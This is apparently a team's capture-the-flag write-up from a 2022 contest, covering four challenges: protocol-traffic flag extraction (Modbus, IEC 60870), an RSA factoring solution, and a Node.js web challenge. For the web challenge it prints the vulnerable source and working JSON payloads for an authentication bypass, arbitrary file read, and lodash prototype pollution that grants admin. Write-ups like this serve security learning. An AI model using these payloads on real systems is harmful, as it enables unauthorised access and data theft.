# 2022巅峰极客决赛

Rank: 11

# StrangeTemporature

Extract nth base64 bytes from modbus/tcp protocl.

```
ZmxhZ3s5N2JmZWIwMy1mYTVjLWFhNmYtYWQxZS05YzVkMzhjNzQ0OWV9
```

From Base64:

```
flag{97bfeb03-fa5c-aa6f-ad1e-9c5d38c7449e}
```

# Nodesystem

In the POST /api we can use an arbitrary filename, find the directory:

```
{"auth": {"name[]":"admin", "password[]":true}, "filename" : "test"}
```

Use the `index.js` we can find the source code.

```
const express = require('express'); 
const bodyParser = require('body-parser'); 
const _ = require('lodash'); 
const app = express(); 
var fs = require('fs'); 

app.set('view engine', 'pug'); 
app.set('views', 'views'); 

app.use(bodyParser.urlencoded({ extended: true })); 
app.use(express.static('static')); 

const users = [
  { name: 'test', password: 'test' }, 
  { name: 'admin', password: Math.random().toString(32), admin: true }, 
]; 

let messages = []; 
let lastId = 1; 

function findUser(auth) { 
  return users.find((u) => 
    u.name === auth.name &&                                                                   
    u.password === auth.password); 
 } 

app.use(bodyParser.json()); 

app.get('/users', (req, res, next) => { 
  const lists = users; 
  res.render('users', { lists: lists, pageTitle: 'List of Users', path: '/users' }); 
 }); 

app.get('/', (req, res, next) => { 
  res.render('home', { pageTitle: 'Home', path: '/' }); 
 }); 

app.post('/', (req, res, next) => { 
  users.push({ name: req.body.name, password: req.body.password }); 
  res.redirect('/users'); 
 }); 

app.get('/message', (req, res) => { 
  res.send(messages); 
 }); 

app.put('/message', (req, res) => { 
  const user = findUser(req.body.auth || {}); 
  console.log(req.body.auth); 
  console.log(user); 
  if (!user) { 
    res.status(403).send({ ok: false, error: 'Access denied' }); 
    return; 
 } 

  const message = { 
    avator: '= =', 
 }; 

  _.merge(message, req.body.message, { 
    id: lastId++, 
    userName: user.name, 
 }); 

  messages.push(message); 
  res.send({ ok: true, message: message }); 
 }); 

app.delete('/', (req, res) => { 
  res.send({ ok: true }); 
 }); 

app.post('/upload', (req, res) => { 
  res.send({ ok: true }); 
 }); 

app.post('/api', (req, res) => { 
	const user = findUser(req.body.auth || {}); 
	if(!user) { 
		res.status(403).send({ ok: false, error: 'Access denied' }); 
		return; 
	 } 

	filename = req.body.filename; 
    testFolder = "/app/";
      fs.readdirSync(testFolder).forEach(file => {
        if (file.indexOf(filename) > -1) {
          var buffer = fs.readFileSync(filename).toString();
          res.send({ok: true, content: buffer});
          }
        });
    });

app.post('/debug', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.admin) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }
  var buffer = fs.readFileSync('/flag').toString();
  res.send({ok: true, content: buffer});
  });

app.listen(80, () => {
    console.log('Listening port 80');
    });
```

In the message function, we can put a prototype pollution.

```
{"auth": {"name":"test", "password":"test"},"message":{"admin":true},"message":{"__proto__":{"admin":true}}}
```

Then request POST /debug:

```
{"auth": {"name":"test", "password":"test"}, "filename":"index.js"}
```

```
flag{bb5c92fd-e976-482d-bd8d-fe75c7709473}
```

# gcd

Find this article: https://math.stackexchange.com/questions/985085/attack-on-rsa-factoring-when-knowing-e-and-d

Then use the method from this pptx: https://web.archive.org/web/20081122133715/https://www.cs.purdue.edu/homes/ninghui/courses/Fall04/lectures/lect14-c.pdf

```python
from math import gcd
from Crypto.Util.number import long_to_bytes

q = 159525841996122259638149337206281835567662617929665920269309853980712285666023866332657448035118551608001550994903698308487351441079422360280138462655773347141043597936907238815312380200758714954107355308055568297512583285577797251677925038300853004432614390391636707991425386888624638839063346101278704535117
p = 103688092798943310982647402600171114966652177364073806894252414673051932505190807013641061853384728919598237520908212107621239686924781921343629185171175594445990343702682252985633398911055809553488617609113015580598645062510893878938013992487439634057319597008364777435777902433026095622460842345150901944567

n = 1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213
x = 13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269
c = 1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015961385580794909106746874670027369932286414096790928966277930586468864071103687837936910843559150279603968747213779555572156135983177121194768041838538456267670795923361920648635769732101772513407467158904982779342496410211785417729464008786654808126619152228029357660596380038858050797654917902576424059433048290426186067840363899227577713800670585547473870112798624948349947633855963137174688403113603549470708467306886181387445601800049442519922530086418265660642841544022198981442640591637598035257382429976435264690303

assert n == p * p * q

e = 65537
phi = p * (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m))

raise Exception()

r = n * x - 1
while r % 2 == 0:
    r //= 2

w = 3793879
w = pow(w, r, n)
v = pow(w, 2, n)
while v != 1:
    w = v
    v = pow(w, 2, n)
    if gcd(w - 1, n) != 1:
        print(gcd(w - 1, n))
    if gcd(w + 1, n) != 1:
        print(gcd(w + 1, n))
```

```
flag{bs903sk_fbnw34f8_cwn3efh}
```

# babyProtocol

Use IOA concat flag:

```
flag{68b34d92d8a8445039dce-d6819d2362d5}
```

```python
import json

s = json.load(open("e:\\desk\\2.json", "r", encoding="utf8"))
d = ['*' for _ in range(99)]
for i in s:
    try:
        r = i['_source']['layers']['iec60870_asdu'].keys()
        for j in r:
            if "IOA" in j:
                dat = i['_source']['layers']['iec60870_asdu'][j]
                idx = int(dat['iec60870_asdu.ioa'])
                c = chr(int(dat["iec60870_asdu.bcr.count"]))
                print(dat)
                if d[idx] != "*" and d[idx] != c:
                    raise Exception("FUCK")
                if dat['iec60870_asdu.bcr.iv'] != '1':
                    d[idx] = c
    except KeyError:
        pass

print(''.join(d))
```

Remove all frames that IV=1

```
flag{68b34d92d88445039dced6819d2362d5}
```
